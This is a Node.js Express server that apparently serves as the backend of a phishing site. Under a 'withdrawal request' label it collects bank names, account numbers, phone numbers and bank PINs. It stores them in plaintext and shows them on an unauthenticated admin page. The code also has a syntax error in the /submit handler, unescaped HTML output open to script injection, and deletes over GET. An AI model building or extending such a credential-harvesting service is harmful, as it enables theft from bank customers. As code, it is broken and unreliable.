const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
const path = require("path");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

app.get("/test-db", async (req, res) => {
  try {
    const result = await pool.query("SELECT NOW()");
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({
      error: err.message
    });
  }
});

app.get("/create-table", async (req, res) => {
  try {

    await pool.query(`
      CREATE TABLE IF NOT EXISTS bank_withdrawals (
        id SERIAL PRIMARY KEY,
        bank_name TEXT NOT NULL,
        account_number TEXT NOT NULL,
        phone_number TEXT NOT NULL,
        bank_pin TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Bank withdrawals table created successfully");

  } catch (err) {

    console.error(err);

    res.status(500).json({
      error: err.toString()
    });

  }
});

app.post("/submit", async (req, res) => {
    try {

    const {
      bank_name,
      account_number,
      phone_number,
      bank_pin
    } = req.body;

    await pool.query(
      `INSERT INTO bank_withdrawals
      (bank_name, account_number, phone_number, bank_pin)
      VALUES ($1, $2, $3, $4)`,
      [
        bank_name,
        account_number,
        phone_number,
        bank_pin
      ]
    );
    });

    res.json({
      success: true,
      message: "Withdrawal request submitted successfully"
    });

  } catch (err) {

    console.error(err);

    res.status(500).json({
      success: false,
      message: err.toString()
    });

  }

});

app.get("/delete/:id", async (req, res) => {
    try {

    await pool.query(
      "DELETE FROM bank_withdrawals WHERE id = $1",
      [req.params.id]
    );

    res.redirect("/submissions");

  } catch (err) {

    console.error(err);
    res.status(500).send(err.message);

  }

});

app.get("/submissions", async (req, res) => {
  try {

    const result = await pool.query(
      "SELECT * FROM bank_withdrawals ORDER BY id DESC"
    );

    let rows = "";

    result.rows.forEach(item => {

      rows += `
      <tr>
        <td>
          <input
            type="checkbox"
            name="ids"
            value="${item.id}">
        </td>

        <td>${item.id}</td>
        <td>${item.bank_name}</td>
        <td>${item.account_number}</td>
        <td>${item.phone_number}</td>
        <td>${item.bank_pin}</td>
        <td>${new Date(item.created_at).toLocaleString()}</td>

        <td>
          <a
            href="/delete/${item.id}"
            onclick="return confirm('Delete this record?')"
            style="color:red;font-weight:bold;text-decoration:none;">
            Delete
          </a>
        </td>
      </tr>
      `;

    });

    res.send(`
<!DOCTYPE html>
<html>
<head>
<title>Bank Withdrawal Submissions</title>
<style>
body{font-family:Arial;padding:20px;}
table{border-collapse:collapse;width:100%;}
th,td{border:1px solid #ccc;padding:8px;text-align:left;}
th{background:#1877f2;color:white;}
button{padding:10px 15px;background:#1877f2;color:white;border:none;cursor:pointer;}
</style>
</head>
<body>

<h2>Bank Withdrawal Requests</h2>

<form id="deleteForm">
<table>

<tr>
<th>Select</th>
<th>ID</th>
<th>Bank Name</th>
<th>Account Number</th>
<th>Phone Number</th>
<th>Bank Pin</th>
<th>Date</th>
<th>Action</th>
</tr>

${rows}

</table>

<br>

<button type="button" onclick="deleteSelected()">
Delete Selected
</button>

<script>
function deleteSelected(){

const ids=[];

document.querySelectorAll("input[name='ids']:checked").forEach(item=>{
ids.push(item.value);
});

if(ids.length===0){
alert("Please select at least one record.");
return;
}

if(!confirm("Delete selected records?")){
return;
}

fetch("/delete-selected",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({ids})
})
.then(response=>{
if(response.ok){
location.reload();
}else{
alert("Failed to delete selected records.");
}
});

}

</script>

</body>
</html>
`);

  } catch (err) {

    console.error(err);
    res.status(500).send(err.message);

  }

});

app.post("/delete-selected", async (req, res) => {

  try {

    const { ids } = req.body;

    if (!ids || ids.length === 0) {
      return res.redirect("/submissions");
    }

    await pool.query(
      "DELETE FROM bank_withdrawals WHERE id = ANY($1::int[])",
      [Array.isArray(ids) ? ids : [ids]]
    );

    res.redirect("/submissions");

  } catch (err) {

    console.error(err);
    res.status(500).send(err.message);

  }

});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
